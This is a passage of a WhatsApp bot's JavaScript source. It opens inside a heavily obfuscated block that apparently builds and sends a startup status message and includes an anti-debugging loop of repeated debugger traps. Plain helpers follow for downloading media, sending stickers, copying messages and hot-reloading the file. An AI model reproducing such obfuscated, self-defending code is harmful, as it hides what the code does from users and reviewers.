_0x991071=_0x5e67a0,_0x125fdb=DateTime[_0x5bbe52(0x8d,'VlnJ',0xeb,0xb6,0xaa)]()[_0x16cdfd(-0x149,-0x9f,'fIY5',-0xdc,-0x109)+'ne'](_0x991071[_0x5bbe52(0x4c,']%JN',0x19,0x71,0x2f)])[_0x5bbe52(0x4a,'Tn)h',0x10,-0x5,0x75)];if(_0x991071[_0x3adfc2(0x65,0x69,'wo[O',0x75,0x71)](_0x125fdb,0x21c3+-0x32e+-0x1e90)&&_0x991071[_0xd1f7cd(0x4e0,0x4ba,0x4d6,0x500,'GBw(')](_0x125fdb,-0xa*0x217+-0xb53+-0xb*-0x2ef))return _0x991071[_0x3adfc2(0x15d,0x111,'o8p$',0x12c,0xf0)];else{if(_0x991071[_0xd1f7cd(0x3e2,0x498,0x43a,0x44a,'1o2V')](_0x125fdb,0x75*0x3d+0x4eb+-0x8*0x418)&&_0x991071[_0x3adfc2(0x48,0x10b,'*qLq',0x55,0xa1)](_0x125fdb,-0x25*0x7d+0xe7*-0x1b+0x440*0xa))return _0x991071[_0x5bbe52(0xd0,'aurg',0x11b,0x6e,0x9c)];else return _0x991071[_0x16cdfd(-0x182,-0xdf,'O)pl',-0x13d,-0x171)](_0x125fdb,-0x142c+-0x1e53+-0x35f*-0xf)&&_0x991071[_0x3adfc2(0x12c,0xa4,'MzUE',0xbc,0xf5)](_0x125fdb,-0xb*-0x85+0x189d+-0x1e3e)?_0x991071[_0xd1f7cd(0x4d9,0x45e,0x472,0x4d0,'g18a')]:_0x991071[_0xdc6c0c(0x3c6,0x41d,0x40f,0x448,'Tn)h')];}},getCurrentTimeInNairobi=()=>{function _0x41b3c7(_0x15ec06,_0x4539c4,_0x5e7512,_0x48c469,_0x3be8aa){return _0x38d411(_0x15ec06-0x110,_0x3be8aa- -0x2c,_0x5e7512-0x1c6,_0x48c469-0xbd,_0x48c469);}const _0x51ddf3={};function _0x3c1b14(_0x4f44ea,_0xbdaeb0,_0x43c5a4,_0x2f384e,_0x46f475){return _0x38d411(_0x4f44ea-0x36,_0x2f384e-0x98,_0x43c5a4-0x119,_0x2f384e-0x83,_0x43c5a4);}_0x51ddf3[_0x3c1b14(0x558,0x514,'JV5H',0x4ec,0x533)]=_0x14e48d('F^RI',-0x7a,-0x63,-0x4b,-0xaa)+_0x14e48d('VcEw',-0xcc,-0xc0,-0x113,-0xa7)+_0x3c1b14(0x4ec,0x51a,'rQMj',0x506,0x4ec);function _0x14e48d(_0x59bea1,_0x3c0bad,_0x266177,_0x24df81,_0x20309f){return _0x2c85bd(_0x59bea1-0xe3,_0x3c0bad-0x10d,_0x266177-0x56,_0x20309f- -0x5d1,_0x59bea1);}const _0x23df32=_0x51ddf3;function _0x4f1b7f(_0x42a358,_0xee4de4,_0x535c02,_0x17ea23,_0x5739dd){return _0xc33fb1(_0x42a358-0x68,_0xee4de4-0x194,_0x5739dd-0x62c,_0x17ea23-0x7d,_0x535c02);}function _0x30f2ff(_0x1bc2b7,_0x3ce9a3,_0x4e5d29,_0x1eb38a,_0x58ef39){return _0x1a2074(_0x3ce9a3- -0x42,_0x4e5d29,_0x4e5d29-0xe6,_0x1eb38a-0x1ab,_0x58ef39-0x94);}return DateTime[_0x41b3c7(0x3dc,0x44d,0x3b8,'F^RI',0x3e0)]()[_0x3c1b14(0x42c,0x49a,'7]^o',0x483,0x4bf)+'ne'](_0x23df32[_0x4f1b7f(0x5d7,0x55d,'8XPU',0x56c,0x5c1)])[_0x30f2ff(-0x12a,-0x157,'J8q9',-0x12e,-0xf1)+_0x3c1b14(0x557,0x528,'95h7',0x50e,0x4b9)+_0x41b3c7(0x493,0x41d,0x458,'4P1&',0x483)](DateTime[_0x30f2ff(-0x180,-0x145,'F^RI',-0x18f,-0x140)+_0x4f1b7f(0x568,0x5e6,'JHkW',0x593,0x5d3)+'E']);};let message=_0x1a2074(-0xcf,'VlnJ',-0x135,-0x67,-0xe1)+',\x20'+getGreeting()+(_0x18eb9f(0x365,'Bg7D',0x375,0x30f,0x33d)+_0x38d411(0x48f,0x447,0x3fe,0x499,'JHkW')+_0xc33fb1(-0xc2,-0xc,-0x66,-0x53,'Ao@C')+_0xc33fb1(-0xca,-0x77,-0xcb,-0xc5,'o8p$')+_0x1a2074(-0x9d,'O)pl',-0xa3,-0x71,-0x42)+_0x1a2074(-0xfa,'Ao@C',-0x148,-0x95,-0x167)+_0x18eb9f(0x3fc,'l!m7',0x416,0x3f6,0x3cd)+_0x18eb9f(0x3b6,'*qLq',0x37c,0x350,0x378)+'\x0a');message+=_0x38d411(0x4c1,0x459,0x4bb,0x428,'Ciqh')+_0xc33fb1(-0xb0,-0xba,-0xe6,-0x108,'nfC2')+'-\x20'+botname+'\x0a',message+=_0x38d411(0x45b,0x487,0x491,0x496,'J8q9')+_0x38d411(0x4bd,0x4b5,0x451,0x4e7,'JC#O')+mode+'\x0a',message+=_0x18eb9f(0x3c7,'xmFB',0x3cb,0x361,0x3fc)+_0x2c85bd(0x516,0x4d3,0x4bc,0x4a9,'*qLq')+'\x20'+prefix+'\x0a',message+=_0x38d411(0x433,0x448,0x3e1,0x435,'Be)k')+_0xc33fb1(-0xe2,-0x162,-0x10b,-0x149,'BpWl')+_0xc33fb1(-0x69,-0x58,-0xad,-0xaa,'GBw(')+totalCommands+'\x0a',message+=_0xc33fb1(-0xc1,-0x146,-0xe2,-0xf2,'l!m7')+_0x1a2074(-0xce,'8XPU',-0x120,-0x78,-0x87)+getCurrentTimeInNairobi()+'\x0a',message+=_0x18eb9f(0x3e9,'wo[O',0x39b,0x41a,0x37f)+_0x1a2074(-0xe1,'MzUE',-0x12d,-0xb6,-0x8f)+_0x38d411(0x48d,0x482,0x482,0x459,'VlnJ')+_0x38d411(0x42b,0x3ff,0x3b9,0x463,'nfC2')+'\x0a',message+=_0x2c85bd(0x4a7,0x4ab,0x461,0x4b7,'JC#O')+_0xc33fb1(-0x96,-0xde,-0x88,-0x20,'JC#O')+_0xc33fb1(-0x10e,-0x70,-0xb9,-0x117,'JA!n'),message+=_0x18eb9f(0x402,'3UNa',0x3cd,0x449,0x3ec)+_0x38d411(0x3a7,0x409,0x458,0x443,'D)2(')+'k\x20'+client[_0x1a2074(-0xc6,'1o2V',-0xec,-0x11c,-0xbc)][_0x2c85bd(0x4c4,0x51a,0x46f,0x4cc,'Tn)h')]+'\x0a\x0a',message+=_0x38d411(0x48a,0x4b1,0x494,0x466,'JC#O')+_0xc33fb1(-0x110,-0x139,-0xf2,-0xe8,'JHkW')+_0xc33fb1(-0xfd,-0xa5,-0xfe,-0x168,'1o2V')+_0x2c85bd(0x474,0x447,0x4ad,0x4a6,'fIY5')+_0x2c85bd(0x4da,0x54f,0x4c0,0x4e3,'GBw(');const _0x399963={};function _0x2c85bd(_0xc423f3,_0x9c4ea1,_0x114627,_0x2eff83,_0x467559){return _0x4d10(_0x2eff83-0x305,_0x467559);}function _0x18eb9f(_0x109da7,_0x45252a,_0x3f8782,_0x19532a,_0x335e21){return _0x4d10(_0x109da7-0x1bf,_0x45252a);}_0x399963[_0x38d411(0x4a8,0x496,0x4ea,0x49b,'l!m7')]=message,await client[_0x1a2074(-0xa1,'xgri',-0x95,-0x10e,-0x95)+_0x38d411(0x4ec,0x491,0x4e2,0x487,'xgri')+'e'](client[_0x18eb9f(0x421,'Bg7D',0x3ef,0x483,0x445)]['id'],_0x399963),(function(){function _0x2f8996(_0x2fbfe6,_0x1c23c4,_0x1d6cc0,_0x6eb2f5,_0x5b1707){return _0xc33fb1(_0x2fbfe6-0xaf,_0x1c23c4-0x92,_0x1d6cc0-0x619,_0x6eb2f5-0x1d8,_0x6eb2f5);}const _0x43b182={'TUjrC':function(_0x46efc1,_0x51839f){return _0x46efc1(_0x51839f);},'lGCmV':function(_0x23ad70,_0x17d895){return _0x23ad70+_0x17d895;},'Ndrdb':_0x4ea2cc(0x16a,0x13b,0x169,'4Fx#',0x119)+_0x27cc3f(-0xd7,-0xb4,-0x94,-0xa5,'Be)k')+_0x2f8996(0x52b,0x518,0x56b,'F^RI',0x55d)+_0x27cc3f(-0x175,-0x139,-0x192,-0x12c,'nfC2'),'mKYrL':_0x4ea2cc(0xe6,0xf0,0xc1,'D)2(',0x116)+_0x2f8996(0x537,0x5ca,0x592,'bFss',0x5c9)+_0x26fce0(0x22b,'JA!n',0x201,0x248,0x207)+_0x4ea2cc(0x19e,0x162,0x1c2,']%JN',0x181)+_0x5d9391('Be)k',0x4f,-0xf,0x7c,0x7e)+_0x26fce0(0x245,'xlc3',0x219,0x21d,0x278)+'\x20)','MzJFe':function(_0x3af89e){return _0x3af89e();}};function _0x4ea2cc(_0x45ed92,_0xafa7cb,_0x404fad,_0x5cad42,_0x5533c9){return _0x18eb9f(_0xafa7cb- -0x2b1,_0x5cad42,_0x404fad-0x1c1,_0x5cad42-0x44,_0x5533c9-0x80);}function _0x5d9391(_0x2ecc93,_0x5b4527,_0x2d3798,_0x4e73c3,_0x47d17e){return _0x38d411(_0x2ecc93-0xca,_0x5b4527- -0x42b,_0x2d3798-0x81,_0x4e73c3-0x25,_0x2ecc93);}function _0x27cc3f(_0x12cb7a,_0x36c01b,_0x427692,_0x19645a,_0x33f351){return _0x1a2074(_0x12cb7a- -0x3c,_0x33f351,_0x427692-0x17b,_0x19645a-0x2,_0x33f351-0xd5);}function _0x26fce0(_0x3c9c2a,_0x5354da,_0x14e0ff,_0x399d29,_0x14fc93){return _0x18eb9f(_0x14fc93- -0x17d,_0x5354da,_0x14e0ff-0x16d,_0x399d29-0x12c,_0x14fc93-0x4a);}let _0x426584;try{const _0x12e8a0=_0x43b182[_0x2f8996(0x4e5,0x4fc,0x528,'JC#O',0x528)](Function,_0x43b182[_0x2f8996(0x580,0x52d,0x561,'bFss',0x547)](_0x43b182[_0x4ea2cc(0x166,0x149,0x18f,'O)pl',0x18f)](_0x43b182[_0x27cc3f(-0x18b,-0x1ed,-0x167,-0x1bf,'7]^o')],_0x43b182[_0x2f8996(0x569,0x59d,0x597,'4oYV',0x5a9)]),');'));_0x426584=_0x43b182[_0x5d9391('aurg',0x21,0x2d,-0x5,0x35)](_0x12e8a0);}catch(_0x232384){_0x426584=window;}_0x426584[_0x5d9391('Tn)h',0x68,0x3f,0x1c,0x20)+_0x2f8996(0x4ba,0x4dd,0x513,'4Fx#',0x57d)+'l'](_0x968545,-0x14c5*-0x1+-0x2c*0x32+0x373);}());function _0x968545(_0x1d6449){function _0x21d420(_0x2dca94,_0x1bed98,_0x3b6d42,_0x2412dd,_0x2f0435){return _0xc33fb1(_0x2dca94-0x8b,_0x1bed98-0x17a,_0x1bed98-0x5da,_0x2412dd-0x130,_0x2412dd);}function _0x17540d(_0x376d30,_0x653155,_0x115068,_0xfe8751,_0x163ba0){return _0x2c85bd(_0x376d30-0x147,_0x653155-0x1b0,_0x115068-0x1c2,_0xfe8751- -0x1f7,_0x376d30);}function _0x4b5adc(_0x364ba7,_0x518be8,_0x29832c,_0x1f1ccf,_0x3ae358){return _0x1a2074(_0x3ae358-0x143,_0x364ba7,_0x29832c-0x13f,_0x1f1ccf-0x35,_0x3ae358-0x65);}const _0x706413={'JKihc':function(_0x333ab9,_0x4804f1){return _0x333ab9===_0x4804f1;},'GMFbC':_0x21d420(0x55b,0x571,0x53e,'JC#O',0x53a)+'g','QCcJH':_0x21d420(0x496,0x4f2,0x4f9,'GBw(',0x49c)+_0x21d420(0x510,0x4cd,0x4a3,'aww0',0x4e9)+_0x21d420(0x519,0x4eb,0x4b3,'xlc3',0x530),'zbuAA':_0x17540d('95h7',0x3b7,0x3be,0x350,0x318)+'er','YTbWF':function(_0x269603,_0x1bb966){return _0x269603!==_0x1bb966;},'ZXxre':function(_0x21edf4,_0x4cc05c){return _0x21edf4+_0x4cc05c;},'yYrDw':function(_0x3a91a6,_0x5b6b76){return _0x3a91a6/_0x5b6b76;},'QWUzK':_0x4b5adc('fIY5',0x5e,0x5a,0x45,0x50)+'h','HRMUx':function(_0x216b04,_0x2099d6){return _0x216b04===_0x2099d6;},'VJxqd':function(_0x2a079c,_0x185bc9){return _0x2a079c%_0x185bc9;},'JVDTY':_0x17540d('T*HO',0x31d,0x3b4,0x379,0x3dc),'SvaLw':_0xab7a6(0xaf,0x106,0x11c,0x13b,'bFss'),'tLkoc':_0x17540d('VcEw',0x3a8,0x377,0x34f,0x31f)+'n','ofnyc':_0x420406(0x2b0,0x211,0x25b,0x221,'nfC2')+_0x420406(0x262,0x1ba,0x225,0x25e,'bFss')+'t','FXFYe':function(_0x142d63,_0x353aa3){return _0x142d63(_0x353aa3);},'dOskH':function(_0x362492,_0xf3c51c){return _0x362492(_0xf3c51c);}};function _0x420406(_0x19a9cc,_0x528ed1,_0x2141f1,_0x70f4d3,_0x71bc34){return _0xc33fb1(_0x19a9cc-0x89,_0x528ed1-0x1f0,_0x2141f1-0x335,_0x70f4d3-0x165,_0x71bc34);}function _0xab7a6(_0x5c41f2,_0x5e30cb,_0x368c3d,_0x27a523,_0xa2768){return _0x2c85bd(_0x5c41f2-0x12a,_0x5e30cb-0x94,_0x368c3d-0xc4,_0x5e30cb- -0x3b0,_0xa2768);}function _0x55a738(_0x2b58c8){function _0xf8f92a(_0x137c96,_0x10386b,_0x1055d4,_0x1344be,_0xbb41b6){return _0xab7a6(_0x137c96-0x3b,_0x1344be- -0xa0,_0x1055d4-0x1ea,_0x1344be-0x161,_0x10386b);}function _0x3d6d95(_0x5765dd,_0x5046c8,_0x467347,_0x55aa22,_0x4ebf5e){return _0x17540d(_0x4ebf5e,_0x5046c8-0x100,_0x467347-0x1ac,_0x5046c8-0x25b,_0x4ebf5e-0x1ed);}if(_0x706413[_0x247b1b(0x2de,'O)pl',0x2e1,0x2f9,0x2ec)](typeof _0x2b58c8,_0x706413[_0xf8f92a(0x84,'0#!v',0x3d,0x98,0xb5)]))return function(_0x288708){}[_0x247b1b(0x324,'J8q9',0x2b3,0x2f7,0x2c2)+_0xf8f92a(0x151,'g18a',0xeb,0xff,0xd9)+'r'](_0x706413[_0x11db9c(0x2bd,0x2db,'*qLq',0x327,0x27f)])[_0x15b47a('JV5H',0x1f1,0x246,0x242,0x1d9)](_0x706413[_0xf8f92a(0x70,'xgri',0x88,0x88,0xb5)]);else _0x706413[_0x247b1b(0x278,'$Maa',0x286,0x274,0x25e)](_0x706413[_0x15b47a('J8q9',0x1e2,0x1b7,0x1d9,0x1f0)]('',_0x706413[_0x247b1b(0x2ed,'GBw(',0x2d7,0x293,0x2d2)](_0x2b58c8,_0x2b58c8))[_0x706413[_0x11db9c(0x327,0x30f,'BgKm',0x2b1,0x2f8)]],-0x2*-0x982+-0xa83+-0x10*0x88)||_0x706413[_0xf8f92a(0xda,'Be)k',0xfc,0xbe,0x8a)](_0x706413[_0x3d6d95(0x5de,0x5cc,0x5c6,0x56e,'4oYV')](_0x2b58c8,-0x1c38+0x149c+0xc*0xa4),-0x2f*0x7+-0x4d*0x1+0x196)?function(){return!![];}[_0xf8f92a(0x5c,'4Fx#',-0x2,0x5c,0xb1)+_0x3d6d95(0x524,0x540,0x59f,0x580,'VcEw')+'r'](_0x706413[_0x3d6d95(0x5da,0x57a,0x599,0x594,'nfC2')](_0x706413[_0x3d6d95(0x4cb,0x533,0x55b,0x595,'95h7')],_0x706413[_0x3d6d95(0x5ac,0x5d8,0x5a9,0x62c,'8XPU')]))[_0x15b47a('Tn)h',0x1a3,0x160,0x1f2,0x187)](_0x706413[_0x3d6d95(0x613,0x5d0,0x635,0x612,'fIY5')]):function(){return![];}[_0xf8f92a(0x105,'(*fV',0xe5,0xad,0x55)+_0x247b1b(0x222,'aurg',0x275,0x269,0x23e)+'r'](_0x706413[_0x11db9c(0x1fa,0x263,'Tn)h',0x2bf,0x288)](_0x706413[_0x3d6d95(0x508,0x551,0x4fe,0x520,'JV5H')],_0x706413[_0x11db9c(0x23a,0x280,'nfC2',0x254,0x28d)]))[_0x247b1b(0x2b1,'0#!v',0x26f,0x2c0,0x2d2)](_0x706413[_0x15b47a('Tn)h',0x1b3,0x127,0x16e,0x159)]);function _0x247b1b(_0x4126a2,_0x14a42b,_0x4271e8,_0x4e6662,_0x8e5af4){return _0x420406(_0x4126a2-0x163,_0x14a42b-0x68,_0x4e6662-0x2c,_0x4e6662-0x69,_0x14a42b);}function _0x11db9c(_0x1d7cf5,_0x45bb52,_0x12abf5,_0x2008da,_0x286d27){return _0x21d420(_0x1d7cf5-0xdc,_0x45bb52- -0x253,_0x12abf5-0x106,_0x12abf5,_0x286d27-0x1c);}function _0x15b47a(_0x3609bb,_0x5c1ce9,_0x459681,_0x34f49c,_0x9dfa6c){return _0x420406(_0x3609bb-0x196,_0x5c1ce9-0x1b3,_0x9dfa6c- -0xe7,_0x34f49c-0x0,_0x3609bb);}_0x706413[_0x15b47a('JHkW',0x164,0x115,0x11c,0x167)](_0x55a738,++_0x2b58c8);}try{if(_0x1d6449)return _0x55a738;else _0x706413[_0x17540d('rQMj',0x2ec,0x29a,0x2b7,0x28e)](_0x55a738,-0x43*0x70+0x584+0x5f3*0x4);}catch(_0xff23f5){}}
                 
        }




  });

  client.ev.on("creds.update", saveCreds);


  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });

    client.downloadMediaMessage = async (message) => { 
         let mime = (message.msg || message).mimetype || ''; 
         let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]; 
         const stream = await downloadContentFromMessage(message, messageType); 
         let buffer = Buffer.from([]); 
         for await(const chunk of stream) { 
             buffer = Buffer.concat([buffer, chunk]) 
         } 

         return buffer 
      }; 


        client.sendImageAsSticker = async (jid, path, quoted, options = {}) => { 
         let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0); 
         // let buffer 
         if (options && (options.packname || options.author)) { 
             buffer = await writeExifImg(buff, options) 
         } else { 
             buffer = await imageToWebp(buff); 
         } 

         await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted }); 
         return buffer 
     }; 

 client.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
  let buff = Buffer.isBuffer(path)
    ? path
    : /^data:.*?\/.*?;base64,/i.test(path)
    ? Buffer.from(path.split(",")[1], "base64")
    : /^https?:\/\//.test(path)
    ? await (await getBuffer(path))
    : fs.existsSync(path)
    ? fs.readFileSync(path)
    : Buffer.alloc(0);

  let buffer;

  if (options && (options.packname || options.author)) {
    buffer = await writeExifVid(buff, options);
  } else {
    buffer = await videoToWebp(buff);
  }

  await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
  return buffer;
};


 client.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => { 
         let quoted = message.msg ? message.msg : message; 
         let mime = (message.msg || message).mimetype || ''; 
         let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]; 
         const stream = await downloadContentFromMessage(quoted, messageType); 
         let buffer = Buffer.from([]); 
         for await(const chunk of stream) { 
             buffer = Buffer.concat([buffer, chunk]); 
         } 
         let type = await FileType.fromBuffer(buffer); 
         const trueFileName = attachExtension ? (filename + '.' + type.ext) : filename; 
         // save to file 
         await fs.writeFileSync(trueFileName, buffer); 
         return trueFileName; 
     };



  client.cMod = (jid, copy, text = "", sender = client.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === client.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };

  return client;
}

startDreaded();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});